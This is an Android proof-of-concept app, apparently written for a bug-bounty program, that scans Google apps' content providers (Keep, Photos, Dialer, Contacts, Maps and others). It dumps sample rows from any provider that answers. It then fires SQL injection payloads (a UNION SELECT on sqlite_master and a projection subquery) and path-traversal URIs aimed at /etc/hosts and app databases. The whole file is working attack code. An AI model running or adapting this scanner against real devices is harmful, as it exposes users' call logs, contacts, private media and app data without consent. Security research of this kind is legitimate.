package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ProviderScanActivity extends Activity {
    private static final String TAG = "ProviderScan";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(9);
        logView.setText("Provider Scan — UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        scanGoogleKeep();
        scanGooglePhotos();
        scanDialer();
        scanCamera();
        scanFiles();
        scanContacts();
        scanYouTube();
        scanMaps();
        testSqliOnAccessible();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void probeProvider(String name, String authority, String path) {
        String uriStr = "content://" + authority + (path != null ? "/" + path : "");
        try {
            Cursor c = getContentResolver().query(Uri.parse(uriStr), null, null, null, null);
            if (c != null) {
                int count = c.getCount();
                int cols = c.getColumnCount();
                String[] colNames = c.getColumnNames();
                StringBuilder colStr = new StringBuilder();
                for (int i = 0; i < Math.min(cols, 10); i++) {
                    if (i > 0) colStr.append(", ");
                    colStr.append(colNames[i]);
                }
                if (cols > 10) colStr.append("... (+" + (cols - 10) + " more)");
                log("[ACCESSIBLE] " + name + ": " + count + " rows, " + cols + " cols");
                log("  Cols: " + colStr);
                if (count > 0 && c.moveToFirst()) {
                    for (int row = 0; row < Math.min(count, 3); row++) {
                        StringBuilder sb = new StringBuilder("  Row " + row + ": ");
                        for (int i = 0; i < Math.min(cols, 5); i++) {
                            if (i > 0) sb.append(" | ");
                            try {
                                String val = c.getString(i);
                                if (val != null && val.length() > 80)
                                    val = val.substring(0, 80) + "...";
                                sb.append(colNames[i]).append("=").append(val);
                            } catch (Exception e) {
                                sb.append(colNames[i]).append("=[blob]");
                            }
                        }
                        log(sb.toString());
                        if (!c.moveToNext()) break;
                    }
                }
                c.close();
            } else {
                log("[NULL] " + name);
            }
        } catch (SecurityException e) {
            log("[DENIED] " + name + ": " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + name + ": " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void scanGoogleKeep() {
        log("=== Google Keep ===");
        probeProvider("Keep main", "com.google.android.keep", null);
        probeProvider("Keep slices", "com.google.android.keep.slices", null);
        probeProvider("Keep clipboard", "com.google.android.keep.editors.clipboard", null);
        probeProvider("Keep clipboard image", "com.google.android.keep.editors.clipboard.image", null);
        probeProvider("Keep bubbles", "com.google.android.keep.messagingextension.bubbles", null);
        probeProvider("Keep genai image", "com.google.android.keep.generativeaiimagefileprovider", null);
        log("");
    }

    private void scanGooglePhotos() {
        log("=== Google Photos ===");
        probeProvider("Photos main", "com.google.android.apps.photos.contentprovider", null);
        probeProvider("Photos photoprovider", "com.google.android.apps.photos.photoprovider", null);
        probeProvider("Photos sharousel", "com.google.android.apps.photos.SharouselContentProvider", null);
        probeProvider("Photos cloudpicker", "com.google.android.apps.photos.cloudpicker", null);
        probeProvider("Photos editor render", "com.google.android.apps.photos.photoeditor.renderedimagecontentprovider", null);
        probeProvider("Photos editor local", "com.google.android.apps.photos.photoeditor.localeditcontentprovider", null);
        probeProvider("Photos backup status", "com.google.android.apps.photos.backup.apiservice.status.BackupStatusContentProvider", null);
        probeProvider("Photos locked media", "com.google.android.apps.photos.mars.contentprovider.local_locked_media", null);
        log("");
    }

    private void scanDialer() {
        log("=== Google Dialer ===");
        probeProvider("Dialer calllog", "com.google.android.dialer.annotatedcalllog", null);
        probeProvider("Dialer preferredsim", "com.google.android.dialer.preferredsimfallback", null);
        probeProvider("Dialer debug dump", "com.android.dialer.debug.dump.dumptools", null);
        probeProvider("Dialer persistentlog", "com.android.dialer.persistentlog", null);
        probeProvider("Dialer soda audio", "com.android.dialer.callscreen.impl.speechrecognition.provider", null);
        probeProvider("Dialer soda transcript", "com.android.dialer.sodatranscription.impl.provider", null);
        probeProvider("Dialer tips", "com.android.dialer.atlas.tipsprovider", null);
        probeProvider("Dialer cache", "com.google.android.dialer.cacheprovider", null);
        probeProvider("Dialer caricon", "com.google.android.dialer.cariconprovider", null);
        log("");
    }

    private void scanCamera() {
        log("=== Google Camera ===");
        probeProvider("Camera metrics", "com.google.android.GoogleCamera.MetricsProvider", null);
        probeProvider("Camera debug", "com.google.android.GoogleCamera.DebugContentProvider", null);
        probeProvider("Camera dbdebug", "com.google.android.GoogleCamera.DbDebugDumper", null);
        probeProvider("Camera specialtypes", "com.google.android.apps.camera.specialtypes.SpecialTypesProvider", null);
        probeProvider("Camera main", "com.google.android.GoogleCamera", null);
        log("");
    }

    private void scanFiles() {
        log("=== Files by Google ===");
        probeProvider("Files main", "com.google.android.apps.nbu.files.provider", null);
        probeProvider("Files cache", "com.google.android.apps.nbu.files.provider.cache", null);
        probeProvider("Files safestorage", "com.google.android.apps.nbu.files.libraries.safestorage.provider", null);
        probeProvider("Files folder sharing", "com.google.android.apps.nbu.files.offlinesharing.foldersharing.provider", null);
        probeProvider("Files google guide", "com.google.android.apps.nbu.files.googleguide.GoogleGuideContentProvider", null);
        log("");
    }

    private void scanContacts() {
        log("=== Google Contacts ===");
        probeProvider("Contacts assistant", "com.google.android.contacts.assistant", null);
        probeProvider("Contacts quickcontact", "com.google.android.contacts.quickcontact", null);
        probeProvider("Contacts yourinfo", "com.google.android.contacts.yourinfo", null);
        probeProvider("Contacts sdn", "com.google.android.contacts.sdn.provider", null);
        probeProvider("Contacts besties", "com.google.android.contacts.besties.provider", null);
        probeProvider("Contacts othercontacts", "com.google.android.contacts.othercontacts", null);
        log("");
    }

    private void scanYouTube() {
        log("=== YouTube ===");
        probeProvider("YouTube suggestions", "com.google.android.youtube.SuggestionProvider", null);
        probeProvider("YouTube suggestions/search", "com.google.android.youtube.SuggestionProvider", "search_suggest_query/test");
        log("");
    }

    private void scanMaps() {
        log("=== Google Maps ===");
        probeProvider("Maps main", "com.google.android.apps.maps", null);
        probeProvider("Maps nav feedback", "com.google.android.apps.maps.nav.feedback", null);
        probeProvider("Maps brella training", "com.google.android.apps.maps.brella.trainingservice.provider", null);
        probeProvider("Maps livetrips", "com.google.android.apps.maps.directions.livetrips.on_device_signal.filesharer.OnDeviceLocationProviders", null);
        log("");
    }

    private void testSqliOnAccessible() {
        log("=== SQLi Tests on Accessible Providers ===");
        String[][] targets = {
            {"com.google.android.youtube.SuggestionProvider", "search_suggest_query/test"},
            {"com.google.android.apps.photos.contentprovider", null},
            {"com.google.android.apps.photos.photoprovider", null},
            {"com.google.android.keep", null},
            {"com.google.android.GoogleCamera", null},
            {"com.google.android.dialer.annotatedcalllog", null},
        };
        for (String[] target : targets) {
            String auth = target[0];
            String path = target[1];
            String uriStr = "content://" + auth + (path != null ? "/" + path : "");
            // First check if accessible
            try {
                Cursor c = getContentResolver().query(Uri.parse(uriStr), null, null, null, null);
                if (c == null) continue;
                int cols = c.getColumnCount();
                int count = c.getCount();
                c.close();
                if (cols == 0) continue;
                log("Testing SQLi on " + auth + " (" + cols + " cols, " + count + " rows)");

                // WHERE injection
                StringBuilder unionPayload = new StringBuilder("1=0) UNION SELECT sql");
                for (int i = 2; i <= cols; i++) unionPayload.append(",").append(i);
                unionPayload.append(" FROM sqlite_master WHERE type='table'--");
                try {
                    Cursor sqli = getContentResolver().query(Uri.parse(uriStr), null, unionPayload.toString(), null, null);
                    if (sqli != null) {
                        if (sqli.getCount() > 0 && sqli.moveToFirst()) {
                            log("  [VULN!] WHERE SQLi: " + sqli.getCount() + " rows — " + sqli.getString(0));
                        } else {
                            log("  WHERE SQLi: 0 rows");
                        }
                        sqli.close();
                    }
                } catch (Exception e) {
                    log("  WHERE SQLi blocked: " + e.getClass().getSimpleName());
                }

                // Projection injection
                try {
                    String[] proj = {"(SELECT group_concat(sql,'|||') FROM sqlite_master WHERE type='table') AS leak"};
                    Cursor sqli = getContentResolver().query(Uri.parse(uriStr), proj, null, null, null);
                    if (sqli != null) {
                        if (sqli.getCount() > 0 && sqli.moveToFirst()) {
                            String leak = sqli.getString(0);
                            if (leak != null && leak.contains("CREATE TABLE")) {
                                log("  [VULN!] PROJECTION SQLi: " + leak.substring(0, Math.min(leak.length(), 200)));
                            } else {
                                log("  Projection: returned but no schema (val=" + leak + ")");
                            }
                        } else {
                            log("  Projection SQLi: 0 rows");
                        }
                        sqli.close();
                    }
                } catch (Exception e) {
                    log("  Projection SQLi blocked: " + e.getClass().getSimpleName());
                }

                // Path traversal on FileProviders
                if (auth.contains("file") || auth.contains("File")) {
                    for (String traversal : new String[]{
                        "content://" + auth + "/../../../../etc/hosts",
                        "content://" + auth + "/../../../data/data/" + auth.split("\\.")[0] + "/databases/",
                    }) {
                        try {
                            java.io.InputStream is = getContentResolver().openInputStream(Uri.parse(traversal));
                            if (is != null) {
                                byte[] buf = new byte[256];
                                int read = is.read(buf);
                                is.close();
                                log("  [VULN!] Path traversal: read " + read + " bytes from " + traversal);
                            }
                        } catch (Exception e) {
                            log("  Path traversal blocked: " + e.getClass().getSimpleName());
                        }
                    }
                }
            } catch (SecurityException e) {
                // not accessible, skip
            } catch (Exception e) {
                // skip
            }
        }
        log("\n=== SCAN COMPLETE ===");
    }
}
